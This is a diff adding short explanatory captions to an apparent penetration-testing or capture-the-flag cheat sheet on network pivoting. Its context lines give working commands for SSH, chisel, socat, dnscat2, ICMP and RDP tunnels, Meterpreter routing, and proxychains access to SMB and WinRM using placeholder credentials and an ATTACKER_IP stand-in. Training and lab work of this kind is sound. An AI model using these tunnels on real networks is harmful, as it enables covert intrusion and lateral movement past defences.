@@ -48,6 +48,7 @@ ssh -J user@HOP1 user@HOP2
 # Background / no shell
 ssh -N -f [options] user@PIVOT_IP
 ```
+> SSH tunneling recipes: `-D` SOCKS, `-L` local forward, `-R` remote forward, `-J` jump host; swap `user`, `PIVOT_IP`, `TARGET_IP`, ports.
 
 ---
 
@@ -68,6 +69,7 @@ sudo ./chisel server --reverse -v -p 1234 --socks5   # on attack host
 curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz \
   -o /tmp/chisel.gz && gunzip /tmp/chisel.gz && chmod +x /tmp/chisel
 ```
+> Chisel SOCKS5 tunnels (forward/reverse) plus a prebuilt-binary download; swap `PIVOT_IP`/`ATTACKER_IP`, port `1234`, and the release version.
 
 ---
 
@@ -87,6 +89,7 @@ proxychains evil-winrm -i 172.16.5.19 -u user -p pass
 proxychains xfreerdp /v:172.16.5.19 /u:user /p:pass /cert:ignore
 proxychains smbclient //172.16.5.19/C$ -U 'user%pass'
 ```
+> Proxychains config lines plus usage examples routing nmap/evil-winrm/xfreerdp/smbclient through the SOCKS proxy; swap the target IP and creds.
 
 ---
 
@@ -103,6 +106,7 @@ socat TCP4-LISTEN:80,fork TCP4-LISTEN:4443,reuseaddr &  # on attack host
 # With SSL (encrypted relay)
 socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork TCP:127.0.0.1:8080
 ```
+> Socat TCP/SSL relays for port forwarding and reverse-shell redirection; swap listen ports, `TARGET_IP`/`ATTACKER_IP`, and `cert.pem`.
 
 ---
 
@@ -116,6 +120,7 @@ ssh -D 9050 -N -f user@ATTACKER_IP            # pivot calls out to attacker
 plink -R 9050 -N user@ATTACKER_IP             # pivot → attacker SOCKS
 # First-run fix (accept host key): cmd /c echo y | plink.exe -R ...
 ```
+> Windows pivot dynamic SOCKS via ssh.exe and remote-forward SOCKS via plink.exe; swap `user`/`ATTACKER_IP` and port `9050`.
 
 ---
 
@@ -135,6 +140,7 @@ netsh.exe interface portproxy show v4tov4
 netsh.exe interface portproxy delete v4tov4 listenport=8080
 netsh advfirewall firewall delete rule name="pivot8080"
 ```
+> Windows-native portproxy: add/show/delete a forward rule plus matching firewall exception; swap `listenport`, `connectport`, and `INTERNAL_IP`.
 
 **Double-hop netsh chain (reach host two hops away):**
 ```cmd
@@ -148,6 +154,7 @@ netsh.exe interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 c
 :: Attack host connects to PIVOT:8081 → reaches 172.16.6.155:3389
 xfreerdp /v:PIVOT_IP:8081 /u:jason /p:'pass' /cert:ignore
 ```
+> Chained portproxy rules across two hops then an RDP connect to the deep target; swap each `connectaddress`, listen ports, and `PIVOT_IP`/creds.
 
 ---
 
@@ -163,6 +170,7 @@ python2.7 client.py --server-ip ATTACKER_IP --server-port 9999
 # proxychains.conf: socks4 127.0.0.1 9050
 # Transfer: scp -r ~/rpivot user@PIVOT_IP:~/
 ```
+> rpivot reverse SOCKS4: server on attack host, client dialing back from the pivot; swap `ATTACKER_IP`, `PIVOT_IP`, and ports 9050/9999.
 
 ---
 
@@ -183,6 +191,7 @@ sudo ./ptunnel-ng -pPIVOT_IP -l2222 -rPIVOT_IP -R22
 # SSH through ICMP tunnel + SOCKS
 ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 ```
+> ptunnel-ng ICMP tunnel: static build, server on pivot, client on attack host, then SSH SOCKS over it; swap `PIVOT_IP`, ports, and SSH user.
 
 ---
 
@@ -203,6 +212,7 @@ dnscat2> window -i 1
 # Port forward inside DNS tunnel
 exec (TARGET) 1> listen 0.0.0.0:8080 172.16.5.19:3389
 ```
+> dnscat2 DNS tunnel: server on attack host, PowerShell client on target, then session interaction and in-tunnel port forward; swap `ATTACKER_IP`, domain, `SECRET`, and forward IPs/ports.
 
 ---
 
@@ -221,6 +231,7 @@ SocksOverRDP-Server.exe
 :: On Win10 pivot — configure Proxifier: socks5 127.0.0.1:1080
 :: Then mstsc.exe → 172.16.6.155 routes through Proxifier
 ```
+> SocksOverRDP chain: register plugin on pivot, RDP to next hop, run server there, then proxy onward; swap the hop IPs and login users.
 
 ---
 
@@ -240,6 +251,7 @@ sessions SESSION_ID
 portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP
 background
 ```
+> Metasploit pivoting: autoroute the internal subnet, run a SOCKS proxy, or portfwd specific ports through a Meterpreter session; swap subnet, `SESSION_ID`, ports, and `REMOTE_IP`.
 
 ---
 
@@ -255,6 +267,7 @@ proxychains smbclient //TARGET_IP/C$ -U 'user%pass' \
 proxychains smbclient //TARGET_IP/C$ -U 'user%pass' \
   -c 'ls Users\user\Desktop\'
 ```
+> Grab the flag over SMB through the proxy (and list the desktop first since flags are often `flag.txt.txt`); swap `TARGET_IP`, creds, and the user path.
 
 ---
 
